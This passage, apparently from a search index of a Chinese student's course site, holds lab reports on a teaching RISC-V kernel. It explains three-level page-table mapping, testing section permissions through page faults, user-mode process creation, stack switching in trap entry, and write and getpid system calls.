<li>\u68c0\u67e5 PTE_V \u4f4d\u662f\u5426\u4e3a 1\uff0c\u5982\u679c\u4e0d\u662f\u5219\u5206\u914d\u65b0\u7684\u9875<ul> <li>\u65b0\u9875\u5bf9\u5e94\u9875\u8868\u9879\u4e3a (\u7269\u7406\u5730\u5740&gt;&gt;12)&lt;&lt;10 \u518d\u52a0\u4e0a PTE_V</li> <li>\u8ba1\u7b97\u540e\u5199\u5165\u6839\u9875\u8868\u5bf9\u5e94\u4f4d\u7f6e\u7684 PTE <pre><code>if ((now_pte &amp; PTE_V) == 0) {\n    uint64 new_page_phy = (uint64)kalloc() - PA2VA_OFFSET;\n    now_pte = ((uint64)new_page_phy &gt;&gt; 12) &lt;&lt; 10 | PTE_V;\n    *(now_tbl + now_vpn) = now_pte;\n}\n</code></pre></li> </ul> </li> </ul> </li> <li>\u7b2c\u4e8c\u7ea7<ul> <li>\u7c7b\u4f3c\u7b2c\u4e00\u7ea7\uff0c\u9875\u8868\u5730\u5740\u8981\u4ece\u7b2c\u4e00\u7ea7\u5f97\u5230\u7684 PTE \u4e2d\u63d0\u53d6\uff0cVPN \u4f7f\u7528 VPN1 <pre><code>now_tbl = (uint64*)(((now_pte &gt;&gt; 10) &lt;&lt; 12) + PA2VA_OFFSET);\nnow_vpn = VPN1(va);\nnow_pte = *(now_tbl + now_vpn);\nif ((now_pte &amp; PTE_V) == 0) {\n    uint64 new_page_phy = (uint64)kalloc() - PA2VA_OFFSET;\n    now_pte = ((uint64)new_page_phy &gt;&gt; 12) &lt;&lt; 10 | PTE_V;\n    *(now_tbl + now_vpn) = now_pte;\n}\n</code></pre></li> </ul> </li> <li>\u7b2c\u4e09\u7ea7<ul> <li>\u6700\u540e\u4e00\u7ea7\uff0c\u9875\u8868\u5730\u5740\u4ece\u7b2c\u4e8c\u7ea7\u5f97\u5230\u7684 PTE \u4e2d\u63d0\u53d6\uff0cVPN \u4f7f\u7528 VPN0</li> <li>\u4e0d\u518d\u9700\u8981\u68c0\u67e5 PTE</li> <li>\u9700\u8981\u8bbe\u7f6e\u6743\u9650 <pre><code>now_tbl = (uint64*)(((now_pte &gt;&gt; 10) &lt;&lt; 12) + PA2VA_OFFSET);\nnow_vpn = VPN0(va);\nnow_pte = ((pa &gt;&gt; 12) &lt;&lt; 10) | perm | PTE_V;\n*(now_tbl + now_vpn) = now_pte;\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab3/#setup_vm_final_1","title":"\u8c03\u7528 setup_vm_final","text":"<p>\u5728 mm_init \u540e\u8c03\u7528 setup_vm_final \u5373\u53ef\uff1a</p> <pre><code>_start:\n    la sp, boot_stack_top\n\n    call setup_vm\n    call relocate\n\n    call mm_init\n    call setup_vm_final\n    call task_init\n</code></pre>"},{"location":"cs/system/cs3/lab3/#_6","title":"\u5b9e\u9a8c\u6d4b\u8bd5\u7ed3\u679c","text":"<p>\u4fee\u6539\u4e00\u4e0b proc.c \u4e2d\u8f93\u51fa\u90e8\u5206\u7684\u4ee3\u7801\uff0c\u8f93\u51fa current \u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd0\u884c\u7ed3\u679c\uff081+3 \u7ebf\u7a0b\uff09</p> <p>1+31 \u7ebf\u7a0b\uff1a</p> <p>\u53ef\u89c1\u5df2\u7ecf\u6b63\u5e38\u542f\u7528\u865a\u62df\u5185\u5b58\u3002</p>"},{"location":"cs/system/cs3/lab3/#_7","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs3/lab3/#text-rodata","title":"\u9a8c\u8bc1 .text, .rodata \u6bb5\u7684\u5c5e\u6027\u662f\u5426\u6210\u529f\u8bbe\u7f6e","text":"<p>\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u8bf4\u660e .text \u6bb5\u6709\u6267\u884c\u6743\u9650\uff0c\u63a5\u4e0b\u6765\u9a8c\u8bc1 .rodata \u6bb5\u662f\u5426\u6709\u6267\u884c\u6743\u9650\u3002\u65b9\u6cd5\u662f\u5728 head.S \u4e2d\u8df3\u8f6c\u5230 start_kernel \u7684\u5730\u65b9\u8df3\u8f6c\u5230 _srodata \u7b26\u53f7\u7684\u4f4d\u7f6e\u8fdb\u884c\u5c1d\u8bd5\u3002\u5982\u679c\u6ca1\u6709\u6267\u884c\u6743\u9650\u5219\u4f1a\u89e6\u53d1\u5f02\u5e38\u8f6c\u5230 trap_handler \u4e2d\u3002</p> <p>trap_handler \u4e2d\u53ea\u7279\u6b8a\u5904\u7406\u4e86\u65f6\u949f\u4e2d\u65ad\uff0c\u5bf9\u4e8e\u5176\u4ed6\u60c5\u51b5\u6211\u4eec\u8f93\u51fa scause \u548c sepc\uff1a</p> <pre><code>void trap_handler(unsigned long scause, unsigned long long sepc) {\n    if ((scause &gt;&gt; 63) &amp;&amp; (scause &amp; 0x7FFFFFFFFFFFFFFF) == 5) {\n        // printk(\"[S] Supervisor Mode Timer Interrupt\\n\");\n        clock_set_next_event();\n        do_timer();\n        return;\n    }\n    Log(\"scause = %lx, sepc = %llx\", scause, sepc);\n}\n</code></pre> <p>\u4f46\u662f\u8fd9\u6837\u4f1a\u5bfc\u81f4 sret \u65f6\u4e00\u76f4\u8df3\u8f6c\u5230\u540c\u4e00\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u624b\u52a8\u7ed9 sepc \u52a0 4\u3002\u76ee\u524d\u6846\u67b6\u7684\u5199\u6cd5\u6700\u7b80\u5355\u7684\u5c31\u662f\u5728 entry.S \u4e2d\u7279\u5224\uff0c\u5982\u679c\u4e0d\u662f\u65f6\u949f\u4e2d\u65ad\u5219\u7ed9 sepc \u52a0\u56db\u518d\u5199\u56de\uff1a</p> <pre><code>    call trap_handler\n\n    # -----------\n\n        # 3. restore sepc and 32 registers (x2(sp) should be restore last) from stack\n\n    ld t0, 0(sp)\n\n    # temporarily add 4 to sepc manually\n    li t1, 0x8000000000000005\n    csrr a0, scause\n    beq a0, t1, _csrwrite\n    addi t0, t0, 4\n_csrwrite:\n\n    csrw sepc, t0\n    addi sp, sp, 8\n\n    ld t6, 0(sp)  \n    ld t5, 8(sp)  \n</code></pre> <p>\u8fd0\u884c\uff08\u5373\u76f4\u63a5 j _srodata\uff09\uff1a</p> <p>\u53ef\u4ee5\u53d1\u73b0\u89e6\u53d1\u4e86\u5f02\u5e38\uff0c\u8f93\u51fa\u7684 scause \u4e3a 0xc \u5373 Instruction Page Fault\uff0c\u8bf4\u660e .rodata \u6bb5\u4e0d\u53ef\u6267\u884c\uff08\u4e5f\u5c31\u662f\u4e0d\u80fd\u4ece\u90a3\u91cc\u8bfb\u53d6\u6307\u4ee4\uff09\u3002</p> <p>\u63a5\u4e0b\u6765\u9a8c\u8bc1 .text \u6bb5\u548c .rodata \u6bb5\u662f\u5426\u53ef\u8bfb\u53ef\u5199\uff0c\u505a\u6cd5\u5c31\u662f\u5728 start_kernel \u51fd\u6570\u4e2d\u76f4\u63a5\u8bbf\u95ee _stext \u548c _srodata \u8d77\u59cb\u7684\u5b57\u8282\uff1a</p> <pre><code>printk(\"_stext = %x\\n\", *_stext);       // \u8bfb\nprintk(\"_srodata = %x\\n\", *_srodata);\n*_stext = 0;                            // \u5199\n*_srodata = 0;\nprintk(\"_stext = %x\\n\", *_stext);\nprintk(\"_srodata = %x\\n\", *_srodata);\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\uff1a</p> <p>\u53ef\u4ee5\u53d1\u73b0\u8bfb\u53d6\u5168\u90e8\u6b63\u5e38\uff0c\u5199\u5165\u7684\u4e24\u6761\u89e6\u53d1\u4e86\u5f02\u5e38\uff0cscause \u4e3a 0xf \u5373 Store/AMO Page Fault\uff0c\u8bf4\u660e .text \u548c .rodata \u6bb5\u90fd\u4e0d\u53ef\u5199\u3002\u5b8c\u5168\u7b26\u5408\u9884\u671f\uff0c\u6743\u9650\u5747\u6b63\u5e38\u8bbe\u7f6e\u3002</p>"},{"location":"cs/system/cs3/lab3/#opensbi","title":"\u7ebf\u6027\u6620\u5c04\u65f6\u80fd\u5426\u4e0d\u5bf9 OpenSBI \u6240\u5728\u7684\u533a\u57df\u8fdb\u884c\u6620\u5c04","text":"<p>\u53ef\u4ee5\uff0c\u56e0\u4e3a OpenSBI \u90e8\u5206\u7684\u4ee3\u7801\u90fd\u662f\u5728 M \u6001\u4e0b\u6267\u884c\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u5730\u5740\uff0c\u4e0d\u9700\u8981\u8fdb\u884c\u6620\u5c04\u3002</p> <p>\u9a8c\u8bc1\u7684\u8bdd\u53ef\u4ee5\u5728 setup_vm \u4e2d\u5c06 va \u548c pa \u90fd\u52a0\u4e0a OpenSBI \u7684\u957f\u5ea6\u504f\u79fb\uff1a</p> <pre><code>void setup_vm(void) {\n    memset(early_pgtbl, 0x0, PGSIZE);\n    uint64 pa = PHY_START + OPENSBI_SIZE, va = VM_START + OPENSBI_SIZE;\n    int index = VPN2(va);\n    early_pgtbl[index] = (((pa &gt;&gt; 30) &amp; 0x3ffffff) &lt;&lt; 28) | PTE_V | PTE_R | PTE_W | PTE_X;\n}\n</code></pre> <p>\u53ef\u4ee5\u65e0\u5dee\u522b\u5730\u6b63\u5e38\u8fd0\u884c\uff0c\u8bf4\u660e\u53ef\u4ee5\u4e0d\u5bf9 OpenSBI \u6240\u5728\u533a\u57df\u8fdb\u884c\u6620\u5c04\u3002</p>"},{"location":"cs/system/cs3/lab3/#sfencevma","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u5728\u4fee\u6539\u9875\u8868\u540e\u6267\u884c sfence.vma \u6307\u4ee4","text":"<p>\u56e0\u4e3a\u4e3a\u4e86\u63d0\u9ad8\u865a\u62df\u5730\u5740\u4e0e\u7269\u7406\u5730\u5740\u8f6c\u6362\u7684\u6548\u7387\uff0cRISC-V \u91c7\u7528\u4e86 TLB\uff08Translation Lookaside Buffer\uff09\u7f13\u5b58\u9875\u8868\u9879\u3002\u4f46\u662f\u5728\u4fee\u6539\u4e86 satp \u66f4\u6362\u4e86\u9875\u8868\u4e4b\u540e\uff0cTLB \u4e2d\u7f13\u5b58\u7684\u90e8\u5206\u5c31\u4e0d\u518d\u6709\u6548\u4e86\uff0c\u9700\u8981\u6267\u884c sfence.vma \u6307\u4ee4\u6765\u6e05\u7a7a TLB\uff0c\u4fdd\u8bc1\u540e\u7eed\u5730\u5740\u8f6c\u6362\u6b63\u5e38\u6267\u884c\u3002</p>"},{"location":"cs/system/cs3/lab4/","title":"RV64 \u7528\u6237\u6a21\u5f0f","text":"<p> \u7ea6 1948 \u4e2a\u5b57  178 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 lab4 \u5b9e\u9a8c\u62a5\u544a\uff082023.05.11 ~ 2023.05.25\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs3/lab4/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u521b\u5efa\u7528\u6237\u6001\u8fdb\u7a0b\uff0c\u5b9e\u73b0\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u7684\u5207\u6362</li> <li>\u5206\u5f00\u8bbe\u7f6e\u7528\u6237\u6808\u548c\u5185\u6838\u6808\uff0c\u5e76\u6b63\u786e\u5207\u6362</li> <li>\u8865\u5145\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u7cfb\u7edf\u8c03\u7528\uff08write\u3001getpid\uff09\u529f\u80fd</li> <li>\u601d\u8003\u9898<ol> <li>\u62f7\u8d1d\u5185\u6838\u9875\u8868\u4e3a\u4ec0\u4e48\u53ef\u4ee5\u76f4\u63a5\u5728\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u8d4b\u503c</li> <li>\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u76f4\u63a5\u4fee\u6539\u5bc4\u5b58\u5668\uff0c\u8981\u4fee\u6539 regs \u7ed3\u6784\u4f53\u4e2d\u5185\u5bb9</li> <li>\u9488\u5bf9\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u8981\u624b\u52a8\u5c06 sepc + 4</li> <li>head.S \u4e2d\u4e3a\u4ec0\u4e48\u8981\u5c06 sstatus[SIE] \u7f6e 0</li> </ol> </li> </ul>"},{"location":"cs/system/cs3/lab4/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"cs/system/cs3/lab4/#_3","title":"\u5b9e\u9a8c\u51c6\u5907","text":"<p>\u6309\u7167\u5b9e\u9a8c\u6307\u5bfc\u4e2d\u8bf4\u7684\u51c6\u5907\u5c31\u53ef\u4ee5\u3002\u5176\u4e2d\u6ca1\u6709\u660e\u786e\u8bf4\u660e\u7684\u4e00\u5904\u662f\u5728\u6839\u76ee\u5f55 Makefile \u4e2d\u6dfb\u52a0 user \u6587\u4ef6\u5939\u7684\u5b50 make \u89c4\u5219\u7684\u4f4d\u7f6e\uff0c\u7531\u4e8e arch/riscv \u4e2d\u9700\u8981\u4f9d\u8d56 user \u4e2d\u751f\u6210\u7684 .o \u6765\u94fe\u63a5\uff0c\u6240\u4ee5\u5728\u8fd9\u4e4b\u524d\u5373\u53ef\uff1a</p> <pre><code>all:\n    ${MAKE} -C lib all\n    ${MAKE} -C init all\n    ${MAKE} -C user all\n    ${MAKE} -C arch/riscv all\n    @echo -e '\\n'Build Finished OK\n</code></pre>"},{"location":"cs/system/cs3/lab4/#_4","title":"\u521b\u5efa\u7528\u6237\u6001\u8fdb\u7a0b","text":""},{"location":"cs/system/cs3/lab4/#proch","title":"\u4fee\u6539 proc.h","text":"<p>proc.h \u4e2d\u7684\u4e00\u4e9b\u5b8f\u5b9a\u4e49\u548c\u7ed3\u6784\u4f53\u5b9a\u4e49\u9700\u8981\u4fee\u6539\u3002\u9996\u5148\u662f\u8fdb\u7a0b\u6570\u8981\u8bbe\u4e3a 1+3\u3002\u7136\u540e\u8981\u4fee\u6539 thread_struct \u7ed3\u6784\u4f53\uff0c\u591a\u4fdd\u5b58 sepc sstatus sscratch\uff1a</p> <pre><code>struct thread_struct {\n    uint64 ra;\n    uint64 sp;\n    uint64 s[12];\n    uint64 sepc, sstatus, sscratch;\n};\n</code></pre> <p>\u63a5\u4e0b\u6765\u8981\u4fee\u6539 task_struct\uff0c\u589e\u52a0\u9875\u8868\u7684\u8bb0\u5f55\u3002\u8fd9\u91cc\u6211\u6ca1\u6709\u6309\u7167\u5b9e\u9a8c\u6307\u5bfc\u4e2d\u7684\u6765\uff0c\u800c\u662f\u76f4\u63a5\u8bb0\u5f55\u4e86\u9700\u8981\u7684 satp\uff0c\u7701\u53bb\u4e86\u5728\u6c47\u7f16\u4e2d\u6839\u636e\u9875\u8868\u5730\u5740\u8ba1\u7b97 satp \u7684\u9ebb\u70e6\u3002\u540c\u65f6\u8fd8\u8981\u8bb0\u5f55\u5185\u6838\u6808\u548c\u7528\u6237\u6808\u7684 sp\uff0c\u867d\u7136\u5f00\u5934\u5c31\u6709\u4e86 thread_info\uff0c\u4f46\u662f\u662f\u4e00\u4e2a\u6307\u9488\u53d8\u91cf\uff0c\u4e0d\u65b9\u4fbf\u5b58\u50a8\u548c\u4f7f\u7528\uff0c\u5220\u6389\u8fd8\u4f1a\u5f71\u54cd\u5df2\u7ecf\u5199\u597d\u4e86\u7684 thread \u7684\u504f\u79fb\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5728\u540e\u9762\u6dfb\u52a0\u4e86 kernel_sp \u548c user_sp\uff1a</p> <pre><code>struct task_struct {\n    struct thread_info* thread_info;\n    uint64 state;    \n    uint64 counter;  \n    uint64 priority; \n    uint64 pid;      \n\n    struct thread_struct thread;\n    uint64 satp;\n    uint64 kernel_sp;\n    uint64 user_sp;\n};\n</code></pre>"},{"location":"cs/system/cs3/lab4/#task_init","title":"\u4fee\u6539 task_init","text":"<p>\u5728 task_init \u521d\u59cb\u5316\u8fdb\u7a0b\u65f6\uff0c\u9700\u8981\u4e3a\u7528\u6237\u6001\u8fdb\u7a0b\u8bbe\u7f6e\u66f4\u591a\u7684\u4fe1\u606f\u3002</p> <ul> <li>\u8bbe\u7f6e\u7528\u6237\u6808\u548c\u5185\u6838\u6808\uff1a<ul> <li>\u5185\u6838\u6808\uff1a\u548c\u4e4b\u524d\u7684 thread.sp \u7b49\u4ef7     <pre><code>_task-&gt;thread.sp = (uint64)_task + PGSIZE;\n_task-&gt;kernel_sp = (uint64)_task + PGSIZE;\n</code></pre></li> <li>\u7528\u6237\u6808\uff1a\u901a\u8fc7 kalloc() \u5206\u914d\u4e00\u4e2a\u65b0\u7684\u9875     <pre><code>_task-&gt;user_sp = kalloc();\n</code></pre></li> </ul> </li> <li>\u521b\u5efa\u81ea\u5df1\u7684\u9875\u8868\u5e76\u8bbe\u7f6e\u65b0\u6620\u5c04<ul> <li>\u7533\u8bf7\u9875\u8868\u7a7a\u95f4\uff0c\u5e76\u5c06\u5185\u6838\u9875\u8868\u62f7\u8d1d\u8fdb\u53bb     <pre><code>uint64* pgtbl = (uint64*)kalloc();\nmemcpy(pgtbl, swapper_pg_dir, PGSIZE);\n</code></pre><ul> <li>memcpy \u9700\u8981\u5728 string.c/h \u4e2d\u5b9e\u73b0\uff0c\u7c7b\u4f3c\u5df2\u6709\u7684 memset     <pre><code>void *memcpy(void *dst, void *src, uint64 n) {\n    char *cdst = (char *)dst;\n    char *csrc = (char *)src;\n    for (uint64 i = 0; i &lt; n; ++i)\n        cdst[i] = csrc[i];\n    return dst;\n}\n</code></pre></li> </ul> </li> <li>\u5c06 uapp \u6620\u5c04\u5230 USER_START \u5f00\u5934\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4     <pre><code>uint64 va = USER_START;\nuint64 pa = (uint64)(uapp_start) - PA2VA_OFFSET;\ncreate_mapping(pgtbl, va, pa, uapp_end - uapp_start, PTE_R | PTE_W | PTE_X | PTE_U | PTE_V);\n</code></pre></li> <li>\u5c06\u7528\u6237\u6808\u6620\u5c04\u5230 USER_END-PGSIZE \u5f00\u5934\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4     <pre><code>va = USER_END - PGSIZE;\npa = (uint64)(_task-&gt;user_sp) - PA2VA_OFFSET;\ncreate_mapping(pgtbl, va, pa, PGSIZE, PTE_R | PTE_W | PTE_U | PTE_V);\n</code></pre></li> <li>\u8ba1\u7b97 satp \u5e76\u8bbe\u7f6e     <pre><code>uint64 satp = csr_read(satp);\nsatp = (satp &gt;&gt; 44) &lt;&lt; 44; // \u6e05\u7a7a PPN\nsatp |= ((uint64)(pgtbl) - PA2VA_OFFSET) &gt;&gt; 12;\n_task-&gt;satp = satp;\n</code></pre></li> </ul> </li> <li>\u8bbe\u7f6e\u5176\u4ed6\u7684 csr \u5bc4\u5b58\u5668\u521d\u59cb\u503c<ul> <li>\u8bbe\u7f6e sepc \u4e3a USER_START     <pre><code>_task-&gt;thread.sepc = USER_START;\n</code></pre></li> <li>\u4fee\u6539 sstatus<ul> <li>SPP \u8bbe\u4e3a 0\uff08\u4f7f sret \u8fd4\u56de\u5230\u7528\u6237\u6001\uff09     <pre><code>sstatus &amp;= ~(1 &lt;&lt; 8)\n</code></pre></li> <li>SPIE \u8bbe\u4e3a 1\uff08sret \u540e\u5f00\u542f\u4e2d\u65ad\uff09     <pre><code>sstatus |= (1 &lt;&lt; 5)\n</code></pre></li> <li>SUM \u8bbe\u4e3a 1\uff08\u5141\u8bb8 S \u8bbf\u95ee U\uff09     <pre><code>sstatus |= (1 &lt;&lt; 18)\n</code></pre></li> <li>\u5199\u5165 thread     <pre><code>_task-&gt;thread.sstatus = sstatus\n</code></pre></li> </ul> </li> <li>\u8bbe\u7f6e sscratch \u4e3a USER_END     <pre><code>_task-&gt;thread.sscratch = USER_END;\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab4/#__switch_to","title":"\u4fee\u6539 __switch_to","text":"<p>__switch_to \u7528\u4e8e\u5728\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u8fdb\u884c\u5207\u6362\uff0c\u5176\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\u5c31\u662f thread_struct \u7ed3\u6784\u4f53\uff0c\u800c\u6211\u4eec\u589e\u52a0\u4e86\u4e09\u4e2a csr \u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u8981\u4fee\u6539\u4e00\u4e0b\u8fd9\u90e8\u5206\uff0c\u6dfb\u52a0\u5bf9\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\u7684\u4fdd\u5b58\u548c\u6062\u590d\uff1a</p> <pre><code>    sd ra,40(a0)\n    ...\n    sd s11,144(a0)\n    csrr t1, sepc\n    sd t1,152(a0)\n    csrr t1, sstatus\n    sd t1,160(a0)\n    csrr t1, sscratch\n    sd t1,168(a0)\n    csrr t1, satp\n    sd t1,176(a0)\n\n    ld ra,40(a1)\n    ...\n    ld t1,152(a1)\n    csrw sepc, t1\n    ld t1,160(a1)\n    csrw sstatus, t1\n    ld t1,168(a1)\n    csrw sscratch, t1\n    ld t1,176(a1)\n    csrw satp, t1\n</code></pre> <p>\u7531\u4e8e\u6211\u76f4\u63a5\u5728 init \u7684\u65f6\u5019\u5c31\u8ba1\u7b97\u597d\u4e86 satp\uff0c\u5e76\u6b63\u597d\u5b58\u50a8\u5728\u4e86 thread_struct \u540e\u9762\u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u8fd9\u91cc\u540c\u65f6\u8fdb\u884c satp \u7684\u4fdd\u5b58\u548c\u6062\u590d\u3002\u5728\u8bbe\u7f6e satp \u540e\u8fd8\u8981\u518d\u52a0\u4e00\u53e5 sfence.vma \u5237\u65b0 TLB \u518d\u8fd4\u56de\u3002</p>"},{"location":"cs/system/cs3/lab4/#trap","title":"\u4fee\u6539 trap \u903b\u8f91\u7b49","text":""},{"location":"cs/system/cs3/lab4/#_traps","title":"\u4fee\u6539 _traps \u5b9e\u73b0\u6808\u5207\u6362","text":"<p>\u7531\u4e8e\u5982\u679c\u5185\u6838\u6001\u89e6\u53d1\u5f02\u5e38\u5219\u4e0d\u8fdb\u884c\u6808\u5207\u6362\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u5224\u65ad\u4e00\u4e0b sscratch \u662f\u5426\u4e3a 0\uff0c\u4e0d\u4e3a 0 \u5219\u4ea4\u6362 sp \u548c sscratch \u8fdb\u884c\u6808\u5207\u6362\u3002</p> <pre><code>_traps:\n    csrr t0, sscratch\n    beq t0, x0, _ignore_switch\n    csrw sscratch, sp\n    mv sp, t0\n\n_ignore_switch:\n    sd ra, -256(sp)\n    ...\n</code></pre> <p>\u540c\u7406\u5728 _traps \u7ed3\u5c3e\u8fd8\u8981\u540c\u6837\u5224\u65ad\u5e76\u5207\u6362\u56de\u6765</p> <pre><code>    ...\n    csrr t0, sscratch\n    beq t0, x0, _traps_sret\n    csrw sscratch, sp\n    mv sp, t0\n\n_traps_sret:\n    sret\n</code></pre>"},{"location":"cs/system/cs3/lab4/#__dummy","title":"\u4fee\u6539 __dummy \u8fdb\u5165\u7528\u6237\u6001\u8fdb\u7a0b","text":"<p>\u9996\u5148\u8981\u5207\u6362\u6808\u7a7a\u95f4\u5230\u7528\u6237\u6808\uff0c\u4e5f\u5c31\u662f USER_END\uff0c\u5373 sscratch \u8bb0\u5f55\u7684\u503c\u3002\u7136\u540e\u8bbe\u7f6e sepc \u4e3a 0\uff0c\u4f7f\u5f97 sret \u8fd4\u56de\u65f6\u8fd4\u56de\u5230\u7528\u6237\u6001\u8fdb\u7a0b\u4ee3\u7801\u6bb5\u5f00\u5934\u7684\u865a\u62df\u5730\u5740\uff1a</p> <pre><code>__dummy:\n    csrr t0, sscratch\n    csrw sscratch, sp\n    mv sp, t0\n    csrwi sepc, 0\n    sret\n</code></pre>"},{"location":"cs/system/cs3/lab4/#_5","title":"\u6dfb\u52a0\u7cfb\u7edf\u8c03\u7528","text":""},{"location":"cs/system/cs3/lab4/#trap_handler","title":"\u6269\u5145 trap_handler \u53c2\u6570","text":"<p>\u6839\u636e\u5b9e\u9a8c\u6307\u5bfc\uff0ctrap_handler \u9700\u8981\u591a\u52a0\u4e00\u4e2a\u53c2\u6570 regs \u6765\u5f15\u7528\u6808\u4e0a\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u503c\uff0c_traps \u4e2d\u624b\u52a8\u8c03\u7528 trap_handler\uff0c\u53c2\u6570\u901a\u8fc7 a0 a1 a2 \u4f20\u9012\uff0c\u6240\u4ee5\u8981\u5c06\u6b63\u786e\u7684\u6808\u5730\u5740\u8d4b\u503c\u7ed9 a2\uff0c\u7136\u540e\u5728 trap_handler \u4e2d\u901a\u8fc7\u6307\u5411\u4e00\u4e2a\u7ed3\u6784\u4f53\u7684\u6307\u9488\u6765\u89e3\u8bfb\u3002</p> <p>\u4e4b\u524d\u5728\u6808\u4e0a\u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u987a\u5e8f\u6709\u4e9b\u6df7\u4e71\uff0c\u80af\u5b9a\u9700\u8981\u6539\u53d8\uff0c\u6240\u4ee5\u4e3a\u4e86\u65b9\u4fbf\u5148\u8bbe\u8ba1\u7ed3\u6784\u4f53\u7684\u5e03\u5c40\uff1a</p> <pre><code>struct pt_regs {\n    uint64 x[32];\n    uint64 sepc;\n};\n</code></pre> <p>\u56e0\u6b64 x0-x31 \u548c sepc \u9700\u8981\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u6392\u5e03\uff0c\u6839\u636e\u8fd9\u4e2a\u7b80\u5355\u4fee\u6539\u4fdd\u5b58\u548c\u6062\u590d\u5bc4\u5b58\u5668\u7684\u987a\u5e8f\u5373\u53ef\uff1a</p> <pre><code>    sd ra, -256(sp)\n    ...\n    sd t6, -16(sp)\n    csrr t0, sepc\n    sd t0, -8(sp)\n    addi sp, sp, -264\n    csrr a0, scause\n    csrr a1, sepc\n    mv a2, sp\n    call trap_handler\n    ...\n    ld t0, 256(sp)\n    csrw sepc, t0\n    addi sp, sp, 8\n    ld t6, 240(sp)\n    ...\n    ld sp, 8(sp)\n</code></pre>"},{"location":"cs/system/cs3/lab4/#_6","title":"\u5b9e\u73b0\u7cfb\u7edf\u8c03\u7528","text":"<p>\u7cfb\u7edf\u8c03\u7528\u662f\u901a\u8fc7 U \u6a21\u5f0f\u4e0b\u6267\u884c ecall \u6307\u4ee4\u89e6\u53d1\u7684\uff0c\u6240\u4ee5 trap_handler \u8981\u6355\u83b7\u7684\u5c31\u662f scause == 8 \u7684\u5f02\u5e38\uff08Environment Call from U-mode\uff09\uff0c\u7136\u540e\u5f53\u4f5c syscall \u6765\u5904\u7406\u3002</p> <p>\u63a5\u4e0b\u6765 a7 \u5373 x17 \u7684\u503c\u4f5c\u4e3a\u7cfb\u7edf\u8c03\u7528\u53f7\uff0ca0-a6 \u5373 x10-x16 \u7684\u503c\u4f5c\u4e3a\u53c2\u6570\uff0ca0 \u4f5c\u4e3a\u8fd4\u56de\u503c\u3002</p> <p>\u540c\u65f6\u9488\u5bf9\u7cfb\u7edf\u8c03\u7528\uff0c\u8fd8\u9700\u8981\u624b\u52a8\u5c06 sepc + 4\uff0c\u4e0a\u6b21 lab \u91cc\u662f\u5728 entry.S \u4e2d\u624b\u52a8\u5224\u65ad\u5e76\u901a\u8fc7\u6c47\u7f16\u52a0\u56db\u7684\uff0c\u8fd9\u91cc\u76f4\u63a5\u901a\u8fc7 regs-&gt;sepc \u4fee\u6539\u6808\u4e0a\u5b58\u50a8\u7684\u503c\uff0c\u7b49\u63a5\u4e0b\u6765\u6062\u590d\u5373\u53ef\u3002</p> <pre><code>struct pt_regs {\n    uint64 x[32];\n    uint64 sepc;\n};\n\nextern struct task_struct* current;\n\nvoid syscall(struct pt_regs* regs) {\n    if (regs-&gt;x[17] == SYS_write) {\n        if (regs-&gt;x[10] == 1) {\n            char* buf = (char*)regs-&gt;x[11];\n            for (int i = 0; i &lt; regs-&gt;x[12]; i++) {\n                printk(\"%c\", buf[i]);\n            }\n            regs-&gt;x[10] = regs-&gt;x[12];\n        } else {\n            printk(\"not support fd = %d\\n\", regs-&gt;x[10]);\n            regs-&gt;x[10] = -1;\n        }\n    } else if (regs-&gt;x[17] == SYS_getpid) {\n        regs-&gt;x[10] = current-&gt;pid;\n    } else {\n        printk(\"not support syscall id = %d\\n\", regs-&gt;x[17]);\n    }\n    regs-&gt;sepc += 4;\n}\n\nvoid trap_handler(uint64 scause, uint64 sepc, struct pt_regs* regs) {\n    if ((scause &gt;&gt; 63) &amp;&amp; (scause &amp; 0x7FFFFFFFFFFFFFFF) == 5) {\n        // printk(\"[S] Supervisor Mode Timer Interrupt\\n\");\n        clock_set_next_event();\n        do_timer();\n        return;\n    } else if (scause == 8) {\n        syscall(regs);\n        return;\n    }\n    Log(\"Unhandled trap: scause = %lx, sepc = %llx\", scause, 